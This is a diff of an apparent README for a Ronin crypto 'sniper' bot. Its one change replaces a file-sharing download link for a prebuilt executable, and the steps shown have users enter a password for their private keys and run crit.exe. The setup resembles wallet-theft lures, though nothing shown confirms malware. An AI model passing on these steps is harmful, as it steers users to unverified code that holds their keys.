@@ -7,7 +7,7 @@ sniper listing and also add multiple ronin accounts for your every transaction.
 
 ### Installation
 
-- Download the application using this [link](https://ln5.sync.com/dl/d55ae3d20/xjz7nbws-5ryxagw3-jjuyw4hr-tgrain2c).
+- Download the application using this [link](https://ln5.sync.com/dl/7264c4020/bujmwm48-xv3hytvh-kwbpus7s-hrg7icf4).
 - Once downloaded extract all the files.
 - Once extracted you will get the folder `crit` folder. On the `data\kek.txt` enter your desired password and salt for encrypting your private keys.(Note:You can move this file anywhere you want if you are not using the bot for security purposes).
 - Run the bot by double clicking the crit.exe file.
